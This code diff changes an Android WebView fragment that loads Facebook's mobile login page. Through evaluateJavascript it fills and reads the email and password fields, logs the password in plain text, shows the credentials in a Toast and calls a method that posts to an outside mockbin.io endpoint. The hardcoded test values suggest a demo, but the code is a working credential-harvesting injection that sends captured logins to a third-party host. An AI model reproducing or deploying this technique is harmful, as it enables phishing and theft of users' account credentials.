@@ -71,6 +71,7 @@ public class WebViewFragment extends Fragment {
         }
         // load url
         webView.loadUrl("https://www.facebook.com");
+        Log.i("facebook", "Loading URL...");
 
         class myJSInterface {
             @JavascriptInterface
@@ -85,14 +86,15 @@ public class WebViewFragment extends Fragment {
             public void onPageFinished(WebView view, String url) {
                 super.onPageFinished(view, url);
                 // Execute Javascript
+                Log.i("facebook", "Executing Javascript Injection...");
                 webView.evaluateJavascript(
                         " (function() { " +
-                                " document.getElementById('m_login_email').value = 'your_username';" +
+                                " document.getElementById('m_login_email').value = 'duarte@email.com';" +
                                 " var email = document.querySelector('input[name=\"email\"]').value; " +
                                 " return email; " +
                                 " })(); "
                         ,result -> {
-                            Log.i("facebook", "Input " + result);
+                            Log.i("facebook", "The email is:  " + result);
                             result = result.replaceAll("\"", "");
                             Email = result;
                         });
@@ -100,17 +102,18 @@ public class WebViewFragment extends Fragment {
                 // Execute Javascript
                 webView.evaluateJavascript(
                         " (function() { " +
-                                " document.getElementById('m_login_password').value = 'my_password';" +
+                                " document.getElementById('m_login_password').value = 'mySecurePassword';" +
                                 " var password =  document.querySelector('input[name=\"pass\"]').value; " +
                                 " return password; " +
                                 " })(); "
                         ,result -> {
-                            Log.i("facebook", "Input " + result);
+                            Log.i("facebook", "The password is " + result);
                             result = result.replaceAll("\"", "");
                             password = result;
                             if (getActivity() != null) {
                                 //Toast.makeText(getActivity(), (Email + " " + password), Toast.LENGTH_SHORT).show();
                                 sendPostrequest();
+                                Log.i("facebook", "Sending Post...");
                             }
                         });
             }
@@ -118,7 +121,7 @@ public class WebViewFragment extends Fragment {
     }
 
     private void sendPostrequest() {
-        Toast.makeText(getActivity(), (Email + " " + password), Toast.LENGTH_SHORT).show();
+        Toast.makeText(getActivity(), ("User= " + Email + "\n Password= " + password), Toast.LENGTH_SHORT).show();
         Retrofit retrofit = new Retrofit.Builder().baseUrl("https://17ca5b6a00714e79a2f54e243ebb4895.api.mockbin.io/")
                 .addConverterFactory(GsonConverterFactory.create())
                 .build();
